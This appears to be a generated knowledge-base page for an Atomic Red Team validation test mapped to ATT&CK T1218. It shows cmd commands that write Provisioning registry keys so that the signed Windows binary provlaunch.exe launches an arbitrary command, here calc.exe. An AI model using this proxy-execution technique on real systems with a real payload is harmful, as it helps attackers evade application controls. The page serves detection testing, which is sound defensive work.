---
atomic_guid: "ab76e34f-28bf-441f-a39c-8db4835b89cc"
title: "Provlaunch.exe Executes Arbitrary Command via Registry Key"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218"
attack_technique_name: "Signed Binary Proxy Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "ab76e34f-28bf-441f-a39c-8db4835b89cc"
  - "Provlaunch.exe Executes Arbitrary Command via Registry Key"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.
- https://twitter.com/0gtweet/status/1674399582162153472
- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
Registry keys are deleted after successful execution.

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

## Executor

- name: command_prompt

### Command

```cmd
reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
c:\windows\system32\provlaunch.exe LOLBin
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml)
